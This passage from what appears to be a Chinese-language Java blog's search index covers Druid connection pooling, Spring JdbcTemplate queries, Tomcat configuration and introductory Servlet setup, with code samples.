class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.druid.pool.DruidDataSourceFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.sql.DataSource;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.sql.Connection;</span><br><span class="line"><span class="keyword">import</span> java.sql.ResultSet;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;</span><br><span class="line"><span class="keyword">import</span> java.sql.Statement;</span><br><span class="line"><span class="keyword">import</span> java.util.Properties;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JDBCUtils</span> &#123;</span><br><span class="line">    <span class="comment">//定义成员变量 DataSource</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> DataSource dataSource;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//加载配置文件</span></span><br><span class="line">            <span class="type">Properties</span> <span class="variable">properties</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Properties</span>();</span><br><span class="line">            properties.load(JDBCUtils.class.getClassLoader().getResourceAsStream(<span class="string">&quot;druid.properties&quot;</span>));</span><br><span class="line">            <span class="comment">//获取连接池对象</span></span><br><span class="line">            dataSource = DruidDataSourceFactory.createDataSource(properties);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//获取连接</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Connection <span class="title function_">getConnection</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">        <span class="keyword">return</span> dataSource.getConnection();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//释放资源</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">close</span><span class="params">(Statement statement, Connection connection)</span> &#123;</span><br><span class="line"><span class="comment">/*        if(statement!=null)&#123;</span></span><br><span class="line"><span class="comment">            try &#123;</span></span><br><span class="line"><span class="comment">                statement.close();</span></span><br><span class="line"><span class="comment">            &#125; catch (SQLException e) &#123;</span></span><br><span class="line"><span class="comment">                e.printStackTrace();</span></span><br><span class="line"><span class="comment">            &#125;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">        if(connection!=null)&#123;</span></span><br><span class="line"><span class="comment">            try &#123;</span></span><br><span class="line"><span class="comment">                connection.close();</span></span><br><span class="line"><span class="comment">            &#125; catch (SQLException e) &#123;</span></span><br><span class="line"><span class="comment">                e.printStackTrace();</span></span><br><span class="line"><span class="comment">            &#125;</span></span><br><span class="line"><span class="comment">        &#125;*/</span></span><br><span class="line">        <span class="comment">//简化</span></span><br><span class="line">        close(<span class="literal">null</span>, statement, connection);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">close</span><span class="params">(ResultSet resultSet, Statement statement, Connection connection)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (resultSet != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                resultSet.close();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (statement != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                statement.close();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (connection != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                connection.close();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//获取连接池方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> DataSource <span class="title function_">getDataSource</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> dataSource;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="5、工具类的测试"><a href="#5、工具类的测试" class="headerlink" title="5、工具类的测试"></a>5、工具类的测试</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        Connection connection=<span class="literal">null</span>;</span><br><span class="line">        PreparedStatement statement=<span class="literal">null</span>;</span><br><span class="line">        ResultSet resultSet=<span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//获取连接</span></span><br><span class="line">            connection=JDBCUtils.getConnection();</span><br><span class="line">            <span class="comment">//sql语句</span></span><br><span class="line">            String sql=<span class="string">&quot;select * from users&quot;</span>;</span><br><span class="line">            statement = connection.prepareStatement(sql);</span><br><span class="line">            resultSet=statement.executeQuery();</span><br><span class="line">            <span class="keyword">while</span> (resultSet.next())&#123;</span><br><span class="line">                <span class="type">int</span> id=resultSet.getInt(<span class="number">1</span>);</span><br><span class="line">                String user=resultSet.getString(<span class="string">&quot;user&quot;</span>);</span><br><span class="line">                String passwd=resultSet.getString(<span class="string">&quot;passwd&quot;</span>);</span><br><span class="line">                System.out.println(id+<span class="string">&quot;--&quot;</span>+user+<span class="string">&quot;--&quot;</span>+passwd);</span><br><span class="line">                <span class="comment">/*输出</span></span><br><span class="line"><span class="comment">                1--aaa--123456</span></span><br><span class="line"><span class="comment">                2--bbb--123</span></span><br><span class="line"><span class="comment">                3--ccc--111</span></span><br><span class="line"><span class="comment">                */</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;<span class="keyword">finally</span> &#123;</span><br><span class="line">            JDBCUtils.close(statement,connection);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="JDBCTemplate-的使用"><a href="#JDBCTemplate-的使用" class="headerlink" title="JDBCTemplate 的使用"></a>JDBCTemplate 的使用</h3><p>Spring 框架对 JDBC 的简单封装。提供了一个 JDBCTemplate 对象简化 JDBC 的开发</p><h4 id="1、jar-包的导入-1"><a href="#1、jar-包的导入-1" class="headerlink" title="1、jar 包的导入"></a>1、jar 包的导入</h4><p><img src="https://img.hacpai.com/file/2019/11/JDBCTemplate%E5%8C%85-2a1047dd.PNG" alt="JDBCTemplate 包.PNG"></p><h4 id="2、JDBCTemplate-方法的操作"><a href="#2、JDBCTemplate-方法的操作" class="headerlink" title="2、JDBCTemplate 方法的操作"></a>2、JDBCTemplate 方法的操作</h4><p>1、update()方法 ：执行增删改。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="comment">//创建JdbcTemplate对象</span></span><br><span class="line">    JdbcTemplate template=<span class="keyword">new</span> <span class="title class_">JdbcTemplate</span>(JDBCUtils.getDataSource());</span><br><span class="line">    <span class="comment">//调用方法</span></span><br><span class="line">    String sql=<span class="string">&quot;update users set passwd=&#x27;123&#x27; where id=?&quot;</span>;</span><br><span class="line">    <span class="type">int</span> num=template.update(sql,<span class="number">3</span>);<span class="comment">// ? 一一对应</span></span><br><span class="line">    <span class="keyword">if</span>(num&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;成功！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>2、queryForMap()：把字段名作为 key，一条数据的值作为 value 封装成一个集合，不能同时查询多条数据。<br>3、queryForList()：将查询的记录封装成 Map，再把 Map 放进 List 集合中。可以查询一条或者多条记录</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="comment">//创建JdbcTemplate对象</span></span><br><span class="line">    <span class="type">JdbcTemplate</span> <span class="variable">template</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JdbcTemplate</span>(JDBCUtils.getDataSource());</span><br><span class="line">    <span class="comment">//调用方法</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;select * from users&quot;</span>;</span><br><span class="line"></span><br><span class="line">    List&lt;Map&lt;String, Object&gt;&gt; maps = template.queryForList(sql);</span><br><span class="line">    <span class="keyword">for</span> (Map&lt;String, Object&gt; form : maps) &#123;</span><br><span class="line">        System.out.println(form);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>4、query():将查询结果封装成 JavaBean 对象。（new BeanPropertyRowMapper&lt; 类型 &gt;(类型.class)）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Integer id;</span><br><span class="line">    <span class="keyword">private</span> String user;</span><br><span class="line">    <span class="keyword">private</span> String passwd;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> Integer <span class="title function_">getId</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setId</span><span class="params">(Integer id)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line">.........</span><br><span class="line">.........</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//创建JdbcTemplate对象</span></span><br><span class="line">    <span class="type">JdbcTemplate</span> <span class="variable">template</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JdbcTemplate</span>(JDBCUtils.getDataSource());</span><br><span class="line">    <span class="comment">//调用方法</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;select * from users&quot;</span>;</span><br><span class="line"></span><br><span class="line">    List&lt;User&gt; query = template.query(sql, <span class="keyword">new</span> <span class="title class_">BeanPropertyRowMapper</span>&lt;User&gt;(User.class));</span><br><span class="line">        <span class="keyword">for</span>(User user:query)&#123;</span><br><span class="line">        System.out.println(user);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>注意： 定义实体类的时候把基本数据类型全部转换为封装类 ，否则当某一个字段的值为空，将无法进行转换。<br>5、queryForObject：将查询结果封装成对象。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据库连接池 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>tomcat配置及Servlet入门</title>
      <link href="/posts/64929/"/>
      <url>/posts/64929/</url>
      
        <content type="html"><![CDATA[<h3 id="Web基础"><a href="#Web基础" class="headerlink" title="Web基础"></a>Web基础</h3><p>web资源分为静态和动态资源，静态资源所有用户访问得到的结果都是一摸一样的，静态资源可以直接被浏览器解析。动态资源每个用户访问相同资源后，得到的结果可能不一样，动态资源访问之后，先转换成静态资源，再返回给浏览器。</p><blockquote><p>什么是静动分离？<br>动静分离是让动态网站里的动态网页根据一定规则把不变的资源和经常变的资源区分开来，动静资源做好了拆分以后，我们就可以根据静态资源的特点将其做缓存操作，这就是网站静态化处理的核心思路</p></blockquote><blockquote><p>为什么要静动分离？<br>当我们去访问网站的时候，有些请求是后台处理，而有些请求则不需要后台处理，为了减少资源的访问次数，所以采用静动分离，提高网站吞吐量。</p></blockquote><p>通信三要素</p><ul><li>IP</li><li>端口</li><li>协议</li></ul><p>常见的java服务器软件</p><ul><li>webLogic</li><li>webSphere</li><li>JBOSS</li><li>Tomcat</li></ul><h3 id="tomcat-配置"><a href="#tomcat-配置" class="headerlink" title="tomcat 配置"></a>tomcat 配置</h3><p>下载地址<code>http://tomcat.apache.org/</code><br>安装:直接解压即可 （注意：安装目录不要有中文和空格）</p><p>目录结构<br><img src="https://img.hacpai.com/file/2019/11/tomcat%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84-83f00ee6.png" alt="tomcat目录结构.png"></p><p>启动 文件目录下的bin目录中的<code>startup.bat</code>文件双击运行 ，Linux有<code>startup.sh</code>文件<br>出现的问题主要有运行窗口一闪而过（原因：java环境配置问题。正确配置JAVA_HOME环境）和启动报错（端口占用问题。）</p><p>部署项目的方式<br>1、直接放在webapps目录下或者将项目打包成war包，在将包放在webapps目录下（war自动解压）<br>2、配置conf&#x2F;server.xml文件，在<Host>标签体中配置<code>&lt;Context docBase=&quot;项目存放的路径&quot; path=&quot;访问路径 &quot; /&gt;</code><br>3、在conf\Catalina\localhost创建任意名称的xml文件。在文件中编写<code>&lt;Context docBase=&quot;项目存放的路径&quot; /&gt;</code> 访问的虚拟目录就是XML文件的文件名</p><h3 id="Servlet-入门"><a href="#Servlet-入门" class="headerlink" title="Servlet 入门"></a>Servlet 入门</h3><h4 id="实现Servlet接口"><a href="#实现Servlet接口" class="headerlink" title="实现Servlet接口"></a>实现Servlet接口</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ServletDemo01</span> <span class="keyword">implements</span> <span class="title class_">Servlet</span> &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 初始化方法，在Servlet被创建时执行，只执行一次</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> servletConfig</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> ServletException</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(ServletConfig servletConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 获取ServletConfig对象，ServletConfig ：Servlet的配置对象</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> ServletConfig <span class="title function_">getServletConfig</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 提供服务的方法，每一次Servlet被访问时都会执行。</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> servletRequest</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> servletResponse</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> ServletException</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> IOException</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">service</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 获取Servlet的一些信息，例如：版本、作者等等。</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getServletInfo</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 销毁的方法，当服务器正常关闭时执行。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="在web-xml中配置Servlet"><a href="#在web-xml中配置Servlet" class="headerlink" title="在web.xml中配置Servlet"></a>在web.xml中配置Servlet</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;servlet&gt;</span><br><span class="line">    &lt;servlet-name&gt;ServletDemo01&lt;/servlet-name&gt; //类名</span><br><span class="line">    &lt;servlet-class&gt;com.stranger.servlet.ServletDemo01&lt;/servlet-class&gt; //类路径</span><br><span class="line">&lt;/servlet&gt;</span><br><span class="line"></span><br><span class="line">&lt;servlet-mapping&gt;</span><br><span class="line">    &lt;servlet-name&gt;ServletDemo01&lt;/servlet-name&gt;//类名</span><br><span class="line">    &lt;url-pattern&gt;/demo01&lt;/url-pattern&gt;//  格式 “/name”  访问名字</span><br><span class="line">&lt;/servlet-mapping&gt;</span><br></pre></td></tr></table></figure><p>当服务器接受到请求之后，会解析请求的url路径，获取Servlet的资源路径，然后去查找web.xml文件，是否有对应的<url-pattern>标签体内容，然后查找类名,找到之后把字节码文件加载到内存调用方法。<br><img src="https://img.hacpai.com/file/2019/11/Servlet%E6%89%A7%E8%A1%8C%E5%8E%9F%E7%90%86-5d47a4a9.PNG" alt="Servlet执行原理.PNG"></p><h4 id="注解配置Servlet"><a href="#注解配置Servlet" class="headerlink" title="注解配置Servlet"></a>注解配置Servlet</h4><p>servlet3.0及以上就可以使用直接使用注解快速配置了，不在创建web.xml</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Target(&#123;ElementType.TYPE&#125;)</span></span><br><span class="line"><span class="meta">@Retention(RetentionPolicy.RUNTIME)</span></span><br><span class="line"><span class="meta">@Documented</span></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> WebServlet &#123;</span><br><span class="line">    String <span class="title function_">name</span><span class="params">()</span> <span class="keyword">default</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    String[] value() <span class="keyword">default</span> &#123;&#125;;</span><br><span class="line"></span><br><span class="line">    String[] urlPatterns() <span class="keyword">default</span> &#123;&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> <span class="title function_">loadOnStartup</span><span class="params">()</span> <span class="keyword">default</span> -<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    WebInitParam[] initParams() <span class="keyword">default</span> &#123;&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">asyncSupported</span><span class="params">()</span> <span class="keyword">default</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    String <span class="title function_">smallIcon</span><span class="params">()</span> <span class="keyword">default</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    String <span class="title function_">largeIcon</span><span class="params">()</span> <span class="keyword">default</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    String <span class="title function_">description</span><span class="params">()</span> <span class="keyword">default</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    String <span class="title function_">displayName</span><span class="params">()</span> <span class="keyword">default</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接在类上使用<code>@WebServlet</code>注解进行配置。（<code>@WebServlet(&quot;资源路径（访问路径）&quot;)</code>）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@WebServlet(&quot;/demo2&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ServletDemo02</span> <span class="keyword">implements</span> <span class="title class_">Servlet</span> &#123;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Servlet </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
